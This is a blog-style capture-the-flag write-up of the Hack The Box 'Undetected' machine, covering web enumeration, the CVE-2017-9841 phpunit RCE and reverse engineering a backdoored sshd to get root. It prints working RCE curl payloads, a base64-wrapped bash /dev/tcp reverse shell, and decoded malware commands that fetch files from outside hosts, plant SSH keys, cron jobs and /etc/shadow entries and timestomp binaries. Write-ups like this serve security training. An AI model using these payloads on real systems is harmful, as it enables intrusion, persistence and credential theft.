@@ -1,0 +1,461 @@
+---
+title: Hackthebox Undetected Writeup
+slug: hackthebox-undetected-writeup
+description: Hackthebox release new machine called undetected, in this machine we find a info file which get us the password and vendor directory reveal the phpunit that vernable to CVE-2017-9841 through that we get the rev shell and for user we use the password which we crack before and get the steven user and for privilege escalation we need to reverse engineering the sshd binary to get root password.
+date: 2022-02-25
+image: hackthebox-undetected-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.146
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-23 04:00 CST
+Nmap scan report for 10.10.11.146
+Host is up (0.52s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
+| ssh-hostkey:
+|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
+|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
+|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Diana's Jewelry
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
+```
+
+## Port-80
+
+It's a simple `static` page.
+
+<FixTheImageURL src='web.png' slug='hackthebox-undetected-writeup' />
+
+## store.djewelry.htb
+
+There is `one` link working that goes to `store.djewelry.htb`
+
+<FixTheImageURL src='web1.png' slug='hackthebox-undetected-writeup' />
+
+Let add this to our `/etc/hosts` file
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.146    store.djewelry.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Going over `store.djewelry.htb` Nothing interesting found.
+
+Simple `static` page.
+
+<FixTheImageURL src='web2.png' slug='hackthebox-undetected-writeup' />
+
+i found a `notice` that said they `migrate` there site and they don't take `orders` now.
+
+<FixTheImageURL src='web3.png' slug='hackthebox-undetected-writeup' />
+
+Let's fire up `gobuster`.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ gobuster dir -u http://store.djewelry.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://store.djewelry.htb/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/02/23 04:23:16 Starting gobuster in directory enumeration mode
+===============================================================
+/info                 (Status: 200) [Size: 27296]
+/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
+/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]
+/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]
+/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]
+/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/]
+/server-status        (Status: 403) [Size: 283]
+
+===============================================================
+2022/02/23 04:29:37 Finished
+===============================================================
+```
+
+Found `2` usefull file and directory `info, vendor`
+
+Info file is a `binary` file let's `download` that
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ curl http://store.djewelry.htb/info  --output info
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 27296  100 27296    0     0  57830      0 --:--:-- --:--:-- --:--:-- 57830
+```
+
+Before `analyzing` it let's use `strings command` to get the `readable` strings.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ strings info | less
+```
+
+Found a `hex` string inside `info` binary.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-undetected-writeup' />
+
+Let's `decode` it.
+
+After `Decoding` hex string it's wget a `authorized_keys` into `/root/.ssh/authorized_keys` and add a hash inside `/etc/shadow` file.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ echo 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b | xxd -r -p
+wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
+```
+
+## Cracking The Hash
+
+Let's `crack` that `hash` first with `john`.
+
+Found a password `ihatehackers` but we can't use this in `ssh` because we don't known that `username`.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ cat hash
+$11:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ john hash -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+ihatehackers     ($11)
+1g 0:00:00:15 DONE (2022-02-23 22:48) 0.06557g/s 5841p/s 5841c/s 5841C/s pinky88..halo03
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+Let's check the `/vendor` directory which we found in `gobuster`
+
+<FixTheImageURL src='web4.png' slug='hackthebox-undetected-writeup' />
+
+There is `tons` of files and folders. I go inside `phpunit` and search on google for that `specific exploit`
+
+First `search` with first `directory` name.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-undetected-writeup' />
+
+Found a `rce` poc.
+
+<FixTheImageURL src='web6.png' slug='hackthebox-undetected-writeup' />
+
+This `vernability` is not inside which we are `searching` but it's in `phpunit` library
+
+<FixTheImageURL src='web7.png' slug='hackthebox-undetected-writeup' />
+
+And we also have that `directory` present.
+
+<FixTheImageURL src='web8.png' slug='hackthebox-undetected-writeup' />
+
+## PHPunit RCE PoC (CVE-2017-9841)
+
+Link : https://gist.github.com/yassineaboukir/1501de6f60dce148824d3001e83fb263
+
+Found a `POC on github` for that `cve` let's `exploit` that.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ curl --data "<?php echo(pi());" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+3.1415926535898┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ curl --data " <?php echo(shell_exec('whoami'));?>" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+ www-data
+```
+
+Now we have the `rce` let's get the reverse `shell`
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ echo "bash -i >& /dev/tcp/10.10.14.49/9001 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS85MDAxIDA+JjEK
+
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ curl --data " <?php echo(shell_exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS85MDAxIDA+JjEK | base64 -d | bash'));?>" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+```
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-undetected-writeup' />
+
+Now we have the `shell` let's check all `user` present in the `machine`.
+
+```js
+www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cat /etc/passwd | grep -i sh$
+/passwd | grep -i sh$
+root:x:0:0:root:/root:/bin/bash
+steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
+steven1:x:1000:1000:,,,:/home/steven:/bin/bash
+```
+
+And i find `two` user `steven, steven1`
+
+Let's try that `password` which we `crack` before.
+
+```js
+www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cat /etc/passwd | grep -i sh$
+/passwd | grep -i sh$
+root:x:0:0:root:/root:/bin/bash
+steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
+steven1:x:1000:1000:,,,:/home/steven:/bin/bash
+www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ su steven
+nu steven
+Password: ihatehackers
+su: Authentication failure
+www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ su steven1
+n1 steven
+Password: ihatehackers
+ls
+Default.php
+eval-stdin.php
+Template
+Windows.php
+id
+uid=1000(steven) gid=1000(steven) groups=1000(steven)
+```
+
+And this `password` is for `steven1` user but when we use `id` command it's `steven` user lol🤣.
+
+Anyway let's use `ssh` and get the `user.txt`.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected]
+└──╼ [★]$ ssh steven1@10.10.11.146
+The authenticity of host '10.10.11.146 (10.10.11.146)' can't be established.
+ECDSA key fingerprint is SHA256:2jPT4mThqEcnA/qjjQsIWwy2QNwGObWQX5MjK5YNvCM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.146' (ECDSA) to the list of known hosts.
+steven1@10.10.11.146's password:
+steven@production:~$ cat user.txt
+139b2e1cfd508249a593198b37f77697
+steven@production:~$
+```
+
+## Privilege escalation
+
+### Recon with linpeas
+
+Found a `mail` for `steven` user.
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-undetected-writeup' />
+
+## Steven Mail
+
+Mail said us about `strange` behaviour with the `Apache service` so we `temporarily` moved.
+
+It's mean `something` wrong with `Apache service`
+
+```js
+steven@production:/var/mail$ ls
+steven
+steven@production:/var/mail$ ls -al
+total 12
+drwxrwsr-x  2 root   mail 4096 Feb  8 19:59 .
+drwxr-xr-x 13 root   root 4096 Feb  8 19:59 ..
+-rw-rw----  1 steven mail  966 Jul 25  2021 steven
+steven@production:/var/mail$ cat steven
+From root@production  Sun, 25 Jul 2021 10:31:12 GMT
+Return-Path: <root@production>
+Received: from production (localhost [127.0.0.1])
+        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
+        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
+Received: (from root@localhost)
+        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
+        Sun, 25 Jul 2021 10:31:12 GMT
+Date: Sun, 25 Jul 2021 10:31:12 GMT
+Message-Id: <202107251031.80FAcdZ171847@production>
+To: steven@production
+From: root@production
+Subject: Investigations
+
+Hi Steven.
+
+We recently updated the system but are still experiencing some strange behaviour with the Apache service.
+We have temporarily moved the web store and database to another server whilst investigations are underway.
+If for any reason you need access to the database or web application code, get in touch with Mark and he
+will generate a temporary password for you to authenticate to the temporary server.
+
+Thanks,
+sysadmin
+```
+
+Let's find the `apache2` directory default directory (`/etc/apache2`).
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-undetected-writeup' />
+
+Found inside `usr/lib/apache2`
+
+```js
+steven@production:/usr/lib/apache2$ ls -al
+total 28
+drwxr-xr-x  3 root root  4096 Jul  5  2021 .
+drwxr-xr-x 82 root root  4096 Feb  8 19:59 ..
+drwxr-xr-x  2 root root 20480 Jan 28 21:05 modules
+steven@production:/usr/lib/apache2$ cd modules/
+steven@production:/usr/lib/apache2/modules$ ls -al
+total 8796
+```
+
+There is one `directory` called `modules` which has total `8796` files let's `sort` them with `latest` updated one's.
+
+```js
+steven@production:/usr/lib/apache2/modules$ ls -ltrh
+total 8.6M
+-rw-r--r-- 1 root root  34K May 17  2021 mod_reader.so
+```
+
+Found a `mod_reader.so` file which is `last` updated
+
+Let's get this file in our `machine` and `analyze` that.
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-undetected-writeup' />
+
+Again before running `ghidra` type stuff let's use `strings command`.
+
+And found a `b64` string.
+
+<FixTheImageURL src='cmd5.png' slug='hackthebox-undetected-writeup' />
+
+After `decoding` it we found that it's `download` the `image.jpeg` and save that with `sshd` name and also change the `date` so we can't find that with `latest updated` file sort `commands`.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ echo d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk | base64 -d
+wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
+```
+
+Let's `download` that `sshd` file.
+
+<FixTheImageURL src='cmd6.png' slug='hackthebox-undetected-writeup' />
+
+## Analyzing The SSDH Binary
+
+With `ghidra` let's filter the result with `password` because first thing i always do find the password in `plain text` to easy `wins`.
+
+And found a `auth_password` function.
+
+Inside that there is backdoor array with size 31 bytes
+
+<FixTheImageURL src='ghidra.png' slug='hackthebox-undetected-writeup' />
+
+Save that `values` inside a file i called this `decomiple.c` because i got `syntax highlighting`.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ cat decomiple.c
+backdoor._28_2_ = 0xa9f4;
+backdoor._24_4_ = 0xbcf0b5e3;
+backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+backdoor[30] = -0x5b;
+backdoor._0_4_ = 0xf0e7abd6;
+backdoor._4_4_ = 0xa4b3a3f3;
+backdoor._8_4_ = 0xf7bbfdc8;
+backdoor._12_4_ = 0xfdb3d6e7;
+```
+
+Arrange them in `descending order`.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ cat decomiple.c
+backdoor[30] = -0x5b;
+backdoor._28_2_ = 0xa9f4;
+backdoor._24_4_ = 0xbcf0b5e3;
+backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+backdoor._12_4_ = 0xfdb3d6e7;
+backdoor._8_4_ = 0xf7bbfdc8;
+backdoor._4_4_ = 0xa4b3a3f3;
+backdoor._0_4_ = 0xf0e7abd6;
+```
+
+And this value is negative `-0x5b` which will be the `invalid value` let's check the `character representation` in `ghidra`.
+
+<FixTheImageURL src='ghidra1.png' slug='hackthebox-undetected-writeup' />
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ cat decomiple.c
+backdoor[30] = 0xa5;
+backdoor._28_2_ = 0xa9f4;
+backdoor._24_4_ = 0xbcf0b5e3;
+backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
+backdoor._12_4_ = 0xfdb3d6e7;
+backdoor._8_4_ = 0xf7bbfdc8;
+backdoor._4_4_ = 0xa4b3a3f3;
+backdoor._0_4_ = 0xf0e7abd6;
+```
+
+Now let's use `CyberChef` to swap the `endianness`.
+
+<FixTheImageURL src='web9.png' slug='hackthebox-undetected-writeup' />
+
+And we use `31 bytes` length because we see before the `array is of 31 bytes`
+
+<FixTheImageURL src='ghidra2.png' slug='hackthebox-undetected-writeup' />
+
+Now `convert` this into `hex`.
+
+<FixTheImageURL src='web10.png' slug='hackthebox-undetected-writeup' />
+
+We got the `blob` because we also need to do `xor` that also.
+
+<FixTheImageURL src='web11.png' slug='hackthebox-undetected-writeup' />
+
+And were we get this `96` key value?
+
+We can see `inside` the `while loop` it's `xor` with `0x96`.
+
+<FixTheImageURL src='ghidra3.png' slug='hackthebox-undetected-writeup' />
+
+And i also provide the `CyberChef` decoding `password` link.
+
+Link : https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,false)From_Hex('Space')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg
+
+Now we have the `password` let's ssh with `root` and get the `root.txt`.
+
+```js
+┌───[us-free-1]─[10.10.14.49]─[root@parrot]─[~/Desktop/HTB/Undetected/www]
+└──╼ [★]$ ssh root@10.10.11.146
+The authenticity of host '10.10.11.146 (10.10.11.146)' can't be established.
+ECDSA key fingerprint is SHA256:2jPT4mThqEcnA/qjjQsIWwy2QNwGObWQX5MjK5YNvCM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.146' (ECDSA) to the list of known hosts.
+root@10.10.11.146's password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
+Last login: Thu Feb 24 13:09:09 2022 from 127.0.0.1
+root@production:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@production:~# cat root.txt
+a1dd552d3c60732f21522e0694c852c7
+root@production:~#
+```
